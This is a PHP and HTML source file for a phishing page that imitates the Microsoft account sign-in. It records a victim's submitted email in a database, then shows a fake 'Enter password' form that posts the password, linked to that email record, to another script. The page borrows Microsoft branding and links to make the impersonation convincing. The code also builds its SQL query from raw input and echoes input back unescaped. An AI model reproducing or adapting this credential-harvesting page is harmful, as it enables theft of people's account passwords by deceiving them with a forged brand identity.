<?php
include("conection.php");


if (isset($_POST['register'])) {
	if (strlen($_POST['email']) >= 1) {
		$email = trim($_POST['email']);
		$fechareg = date("d/m/y");
		$consulta = "INSERT INTO emaildb (email, password, fecha_reg) VALUES ('$email', '?', '$fechareg')";

		$resultado = mysqli_query($conex2,$consulta);
		$id=mysqli_insert_id($conex2);
		if ($resultado) {
			?> 
			
		   <?php
		  
		} else {
			?> 
			
		   <?php

		}
	}   else { 
			?>

			<?php
		}	

}

?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
		<title>Sign in to your Microsoft account</title>
		<link rel="icon" href="img/favicon.ico">
		<link rel="stylesheet" href="css/StyleSecond.css">
		<!-- Bootstrap 4 -->
		<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
		<!-- MDB 5 -->
		<link
		  href="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.5.0/mdb.min.css"
		  rel="stylesheet"
		/>
	</head>
	<body> 
		<div class="bg-sucess row align-items-center justify-content-center vh-100 mt-4">

			<form class="card container p-4 tamaño-container" action="registor.php?variable1=<?php echo $id ?>" method="post">

				  <div class="container mt-3">
					<img class="float-left " src="img/card.svg" width="108" height="24" alt="imagen-microsoft-two" >
				  </div>

					<div class="card-body">
					   <div class="d-flex">
						   	<a href="index.php">
						   		<img src="img/arrow-left.svg" alt="flecha-img">
						   	</a>
						   	<?php
						   	echo "<p> $email</p>";
						   	?>
					   </div>

						<h4 class="card-title mb-2 font-weight-normal text-black">Enter password</h4>

					   <div class="md-form mb-3">
							<input type="password" id="password" name="pass" class="form-control mail-colector" placeholder="Password">
						</div>

							<div class="mb-2 mt-2">
							   <input type="checkbox">
							   <span> Keep me signed in</span>
							</div>	
						   <p class="card-text mb-2"><a href="">
							Forgot password? </a></p>		
					</div>

		  				<!-- BUTTON -->
		  			<div class="text-right mr-2 mb-3">
						<input type="submit" name="send" value="Sign In" class="btn btn-primary font-weight-italic text-capitalize px-4" style="font-size: 1rem;">
            		</div>
			</form>
		</div>
		<footer class="fixed-bottom p-2">
			<div class="float-right ">
				<a class="mx-2 text-white small" href="https://www.microsoft.com/es-es/servicesagreement/">Terms of use</a>
				<a class="mx-2 text-white small" href="https://privacy.microsoft.com/es-es/privacystatement">Privacy & cookies</a>
				<a class="mx-2 text-white small" href="#">...</a>
			</div>
		</footer>
		
		<!-- Js Bootstrap 5 -->
		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
		<!-- Js MDB -->
		<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mdb-ui-kit/3.5.0/mdb.min.js"> </script>
		<script type="text/javascript" src="js/script.js"></script>

	</body>	
</html>